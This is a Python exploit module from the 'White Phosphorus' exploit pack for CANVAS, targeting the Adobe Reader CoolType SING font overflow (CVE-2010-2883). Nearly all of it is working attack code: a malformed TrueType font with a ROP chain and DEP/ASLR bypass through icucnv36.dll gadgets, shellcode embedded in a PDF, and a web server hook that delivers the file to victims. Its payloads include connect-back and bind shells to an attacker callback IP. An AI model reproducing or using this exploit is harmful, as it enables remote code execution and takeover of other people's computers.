
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
import zlib
import shutil
from struct import *
from cStringIO import StringIO

# CANVAS imports
from exploitutils import *
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from MOSDEF import mosdef
from httpclientside import httpclientside


######################################################################################
NAME = "Adobe Reader Cooltype Font SING Header Overflow"
DESCRIPTION = "Exploits an overflow in Adobe Reader <=v9.3.4"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Adobe'
DOCUMENTATION["Date public"] = ""
DOCUMENTATION['VersionsAffected']='Confirmed on Adobe Reader 9.1.0, 9.3.0, 9.3.4 IE 6,7,8'
DOCUMENTATION["References"] = """http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html
http://www.adobe.com/support/security/advisories/apsa10-02.html"""
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "CVE-2010-2883"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2883'
DOCUMENTATION['CVSS'] = '7.1'
DOCUMENTATION['Notes']="""
This is a client-side exploit - so use it via clientd or httpserver.
Alternativly, you can create the exploit file and send it to the target user.

Confirmed on Adobe Reader 9.1.0, 9.3.0, 9.3.4
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "7", "Vista"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a client-side exploit - so use it via clientd or httpserver.
Alternativly, you can create the exploit file and send it to the target user.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Adobe Reader Cooltype Font SING Header Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal (DEP/ASLR BYPASS)

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_adobe_sing/wp_adobe_sing.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (DEP/ASLR BYPASS)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit,httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]
              
    # Clienside exploits default to HTTPMosdef PLAIN for clientD
    DEFAULT_PAYLOAD = 3

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.use_universal = True
        
        # We default these to false        
        self.HTTPMOSDEF = False
        self.useSSLMOSDEF = False
        self.isClientD=False
           
        self.badstring='\x0d\x5c'
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + '.pdf'
        
        return
        
    def is_vulnerable(self, info_dict):
        # Called from ClientD, if recon modules are enabled
        # returns a value used to rank the exploit within attacking modules
        """
        Check for AdobeReader
        """
        self.isClientD = True
        major, minor, build, patch = self.getReaderVersions(info_dict)
        if not major:
            #no Reader
            return 0
        if major == 9:
            if minor == 3:
                return 90
        # possibly works on older versions
        return 50
    
    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if getattr(self,'useSSLMOSDEF',False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 2

        else:
            # Potentially called from httpserver update shellcode accordingly        
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 2
                else:
                    self.DEFAULT_PAYLOAD = 3
                
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return
  
    def makecff(self):

        from cStringIO import StringIO
        searchcode = wp_SearchCode(False)  
        
        f = open('3rdparty/White_Phosphorus/exploits/wp_foxit_cff/out.cff','wb')
        f.write(open('3rdparty/White_Phosphorus/exploits/wp_foxit_cff/z.cff','rb').read())
        
    
        f.write(gvalue2)
        return


    def pdfDef(self,value):
        return "%d 0 obj \n" % value

    def pdfRef(self,value):
        return "%d 0 R" % value
	
    	    	
    def maketffFile(self):
        # read the font template
        tffFile = open('3rdparty/White_Phosphorus/exploits/wp_adobe_sing/verafont.ttf','rb').read()

        # Sing header record
        sing = struct.pack('<h',0)          #tableVersionMajor
        sing += struct.pack('<h',1)         #tableVersionMinor
        sing += struct.pack('<h',0xe01)     #glyphletVersion
        sing += struct.pack('<h',0x100)     #embeddingInfo
        sing += struct.pack('<h',0)         #mainGID
        sing += struct.pack('<h',0)         #unitsPerEm
        sing += struct.pack('<h',0)         #vertAdvance
        sing += struct.pack('<h',0x3a00)    #vertOrigin
        
        sing += "A" * (0x254 - len(sing))
        
        # Writeable Address
        waddr=0x4a8a0962
        sing= wp_insertdata(sing,0x140,struct.pack('<L',waddr))
        
        # This becomes our new EIP (puts esp to stack buffer)
        ret = 0x4A83A93A   # PUSH EAX, ret
        #ret = 0x90909090 # add ebp, 0x794 / leave / ret ??????????????????
        sing = wp_insertdata(sing,0x208,struct.pack('<L',ret))
       
        # Without the following, sub_801ba57 returns 0.
        sing = wp_insertdata(sing,0x24c,struct.pack('<L',0x6c))
        
        #WP CoDEZ icucnv36.dll @ 4a800000
        retcode = struct.pack('<L',0x4A8477B8)  # POP EDX
        retcode += struct.pack('<L',waddr)       # Writable
        retcode += struct.pack('<L',0x4A801F90)  # POP EAX
        retcode += struct.pack('<L',0xFFFFEFA8)  # neg(1058)
        retcode += struct.pack('<L',0x4A80D58D)  # NEG EAX
        retcode += struct.pack('<L',0x4A8448F9)  # ADD ECX,EAX
        retcode += struct.pack('<L',0x4A8448F9)  # SCRATCH
        retcode += struct.pack('<L',0x4A81F204)  # MOV EAX,DWORD PTR DS:[ECX]
        retcode += struct.pack('<L',0x4A801165)  # INC EAX  (align for stack)
        retcode += struct.pack('<L',0x4A801165)  # INC EAX  (align for stack)
        retcode += struct.pack('<L',0x4A83A93A)  # PUSH EAX, RET

        # insert it
        sing = wp_insertdata(sing,0x24c-60,retcode)
        
        tffFile = wp_insertdata(tffFile,0xec,"SING")
        tffFile = wp_insertdata(tffFile,0x11c,sing)

        fd=file("test.ttf",'wb+')
        fd.write(tffFile)
        fd.close()
        
        return tffFile
    
    def makefile(self):
        # get the font data
        tffFile = self.maketffFile()
        javadata = ""
        
        depbypass = "\x11\x11"                     # SCRATCH
        depbypass += struct.pack('<L',0x11111111)  # SCRATCH
        depbypass += struct.pack('<L',0x11111111)  # SCRATCH
        # MapViewOfFile DEP Bypass
        depbypass += struct.pack('<L',0x4A801F90)  # POP EAX,RET
        depbypass += struct.pack('<L',0x4A849038)  # IAT CreateFileMapping
        depbypass += struct.pack('<L',0x4A80B692)  # JMP DWORD PTR DS:[EAX]
        depbypass += struct.pack('<L',0x4A82C724)  # MOV ECX,EAX RET FROM ^
        depbypass += struct.pack('<L',0xFFFFFFFF)  # hFile
        depbypass += struct.pack('<L',0x0000000)   # Security
        depbypass += struct.pack('<L',0x00000040)  # Protection
        depbypass += struct.pack('<L',0x00000000)  # High Size
        depbypass += struct.pack('<L',0x00004000)  # Low Size
        depbypass += struct.pack('<L',0x00000000)  # Name
        # MapViewOfFile
        depbypass += struct.pack('<L',0x4A801F90)  # POP EAX,RET
        depbypass += struct.pack('<L',0x4A849030)  # IAT MapViewOfFile
        depbypass += struct.pack('<L',0x4A80A7D8)  # MOV EAX,DWORD PTR DS:[EAX]
        depbypass += struct.pack('<L',0x4A8063A1)  # PUSH ECX, CALL EAX, POP, POP, RETN
        depbypass += struct.pack('<L',0x00000022)  # Write/Execute
        depbypass += struct.pack('<L',0x00000000)  # dwFileOffsetHigh
        depbypass += struct.pack('<L',0x00000000)  # dwFileOffsetHigh
        depbypass += struct.pack('<L',0x00000000)  # dwNumberOfBytesToMap (ALL)
        depbypass += struct.pack('<L',0x11111111)  # SCRATCH
        depbypass += struct.pack('<L',0x11111111)  # SCRATCH
        # MemCpy
        depbypass += struct.pack('<L',0x4A80155A)  # POP EDI, RET
        depbypass += struct.pack('<L',0x4A846C5E)  # JMP DWORD PTR DS:[<&MSVCR80.memcpy>]     ; MSVCR80.memcpy
        depbypass += struct.pack('<L',0x4A8010C5)  # POP ESI
        depbypass += struct.pack('<L',0x4A8021B2)  # CALL EAX (return to shellcode)
        depbypass += struct.pack('<L',0x4A817B6B)  # XCHG EAX,EBP
        depbypass += struct.pack('<L',0x4A802AB1)  # POP EBX,RET
        depbypass += struct.pack('<L',0x00001000)  # Size of copy
        depbypass += struct.pack('<L',0x4A80848A)  # 4A80848A
        
        #depbypass += struct.pack('<L',0xCCCCCCCC)  # NOPS

        # build the file
        filedata =""
        
        xref=[]
        
        # Version
        filedata +="%PDF-1.5\n"
        filedata +="%" + wp_randomstring(4) + "\n"
                
        # catalog
        xref.append(len(filedata))
        filedata += self.pdfDef(1) + "<<\n"
        filedata += "/Pages " + self.pdfRef(2) + "\n"
        filedata += "/Type /Catalog\n"
        filedata += "/OpenAction " + self.pdfRef(11) + "\n"
        filedata += "/AcroForm " + self.pdfRef(13) + "\n"
        filedata += ">>\n"
        filedata += "endobj\n"
                
        # pages array
        xref.append(len(filedata))
        filedata += self.pdfDef(2) + "<<\n"
        filedata += "/MediaBox " + self.pdfRef(3) + "\n"
        filedata += "/Resources " + self.pdfRef(4) + "\n"
        filedata += "/Kids [" + self.pdfRef(5) + "]\n"
        filedata += "/Count 1\n"
        filedata += "/Type /Pages\n"
        filedata += ">>\n"
        filedata += "endobj\n"
        
        # media box
        xref.append(len(filedata))
        filedata += self.pdfDef(3)
        filedata += "[0 0 595 842]\n"
        filedata += "endobj\n"     
        
        # resources
        xref.append(len(filedata))
        filedata += self.pdfDef(4)
        filedata += "<<\n"
        filedata += "/Font " + self.pdfRef(6) + "\n"
        filedata += ">>\n"
        filedata += "endobj\n"     
        
        # page 1
        xref.append(len(filedata))
        filedata += self.pdfDef(5) + "<<\n"
        filedata += "/Parent " + self.pdfRef(2) + "\n"
        filedata += "/MediaBox " + self.pdfRef(3) + "\n"
        filedata += "/Resources " + self.pdfRef(4) + "\n"
        filedata += "/Contents [" + self.pdfRef(8) + "]\n"
        filedata += "/Type /Page\n"
        filedata += ">>\n"
        filedata += "endobj\n"
        
        # font
        xref.append(len(filedata))
        filedata += self.pdfDef(6) + "<<\n"
        filedata += "/F1 " + self.pdfRef(7) + "\n"        
        filedata += ">>\n"
        filedata += "endobj\n"
        
        # ttf object
        xref.append(len(filedata))
        filedata += self.pdfDef(7) + "<<\n"
        filedata += "/Type /Font\n"
        filedata += "/Subtype /TrueType\n"
        filedata += "/Name /F1\n"
        filedata += "/BaseFont /Cinema\n"
        filedata += "/Widths []\n"        
        filedata += "/FontDescriptor " + self.pdfRef(9) + "/Encoding /MacRomanEncoding\n"        
        filedata += ">>\n"
        filedata += "endobj\n"
        
        # page content
        #content = "Hello World!"
        content = depbypass + self.shellcode + "\x00" * 100 
        
        content = "" + "0 g\n" +  "BT\n" + "/F1 32 Tf\n" + "32 Tc\n"+  "1 0 0 1 32 773.872 Tm\n" + "(" + content + ") Tj\n"+ "ET"
        
        xref.append(len(filedata))
        filedata += self.pdfDef(8) + "<<\n"
        filedata += "/Length %s\n" % len(content)        
        filedata += ">>\n"
        filedata += "stream\n"
        filedata += "%s\n" % content
        filedata += "endstream\n"        
        filedata += "endobj\n"
        
        # font descriptor
        xref.append(len(filedata))
        filedata += self.pdfDef(9) + "<<\n"
        filedata += "/Type/FontDescriptor/FontName/Cinema/Flags %d" % (2**2 + 2**6 + 2**17) + "/FontBBox [-177 -269 1123 866]/FontFile2 " + self.pdfRef(10) + ">>\n"
        filedata += "endobj\n"
        
        # ttf stream
        compressdata = zlib.compress(tffFile)
        xref.append(len(filedata))
        filedata += self.pdfDef(10) + "<<\n"
        filedata += "/Length %s/Filter/FlateDecode/Length1 %s>>\n"%(len(compressdata),len(tffFile))
        filedata += "stream\n"
        filedata += "%s\n" % compressdata
        filedata += "endstream\n"
        filedata += "stream\n"
        filedata += "endobj\n"
        
        # js action
        xref.append(len(filedata))
        filedata += self.pdfDef(11) + "<<\n"		
        filedata += "/Type/Action/S/JavaScript/JS " +self.pdfRef(12) + "\n"
        filedata += ">>\n"
        filedata += "endobj\n"
        
        # js stream
        xref.append(len(filedata))
        filedata += self.pdfDef(12) + "<<\n"	
        filedata += "/Length %s>>\n" % len(javadata)
        filedata += "stream\n"
        filedata += "%s\n" % javadata
        filedata += "endstream\n"
        filedata += "endobj\n"
        
        #compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
        #pdf << ioDef(12) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
        
        #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
        

		# The following form related data is required to get icucnv36.dll to load
        # form object
        xref.append(len(filedata))
        filedata += self.pdfDef(13)
        filedata += "<</XFA " + self.pdfRef(14) + ">>\n"
        filedata += "endobj\n"
        
        # formstream
        formstream = """<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <config xmlns="http://www.xfa.org/schema/xci/2.6/">
    <present>
      <pdf>
        <interactive>1</interactive>
      </pdf>
    </present>
  </config>
  <template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
    <subform name="form1" layout="tb" locale="en_US">
      <pageSet>
      </pageSet>
    </subform>
  </template>
</xdp:xdp>"""
        xref.append(len(filedata))
        filedata += self.pdfDef(14) + "<</Length %s>>" % len(formstream) + "\n"
        filedata += "stream\n"
        filedata += "%s\n" % formstream
        filedata += "endstream\n"
        filedata += "endobj\n"
        
        # end form stuff for icucnv36.dll
        
        xrefPosition = len(filedata)
        filedata += "xref\n"
        filedata += "0 %d\n" % (len(xref)+1)
        filedata += "0000000000 65535 f\n"
        
        for ref in xref:
            filedata += "%010d 00000 n\n" % ref
            
        filedata += "trailer\n"
        filedata += "<</Size %d/Root "%(len(xref)+1) + self.pdfRef(1) + ">>\n" 
        filedata += "startxref\n"
        filedata += "%s\n" % xrefPosition
        filedata += "%%EOF\n"
        
        return filedata
        
    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log('WP> ****************************************')
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')        
        
        #self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit pdf file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','application/pdf')
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        self.log('WP> ****************************************')
        return h,b        

    def run(self):
        filedata=self.makefile()
        
        self.log("WP> Opening %s for output"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
